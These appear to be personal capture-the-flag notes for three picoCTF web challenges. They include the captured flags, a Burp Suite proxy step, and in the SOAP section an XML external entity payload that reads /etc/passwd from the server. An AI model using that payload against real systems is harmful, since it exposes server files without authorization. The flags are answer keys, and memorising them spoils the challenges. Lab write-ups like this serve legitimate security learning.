
## findme

- Use burp suite proxy and type in login details. 
- Find that there are some GET requests:
	![[Pasted image 20231107101401.png]]
![[Pasted image 20231107101427.png]]


Flag = picoCTF{proxies_all_the_way_25bbae9a}

## MatchTheRejex

Just type in picoCTF into the input field to get the flag

Flag = picoCTF{succ3ssfully_matchtheregex_8ad436ed}
![[Pasted image 20231107102731.png]]

## SOAP

XXE - xml external entity

Add the following code to the xxe that is sent to the server.

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```


